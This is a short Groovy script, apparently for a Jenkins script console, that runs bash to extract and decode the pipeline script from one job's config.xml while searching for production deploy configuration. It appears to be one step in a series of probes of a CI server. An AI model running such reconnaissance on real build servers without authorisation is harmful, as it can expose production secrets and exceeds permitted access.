// MICRO-V: Read full Jenkinsfile via sed + find PROD deploy config
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(7000)
}

// Full caja-api pipeline script (sed decode HTML entities)
println "=== CAJA-API PIPELINE FULL SCRIPT ==="
def r1 = run('''
awk '/<script>/{found=1; next} /<\\/script>/{found=0; next} found' \
  /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/config.xml \
  | sed "s/&apos;/'/g; s/&quot;/\"/g; s/&lt;/</g; s/&gt;/>/g; s/&amp;/\\&/g"
''')
println r1

println "\n=== DONE MICRO-V ==="
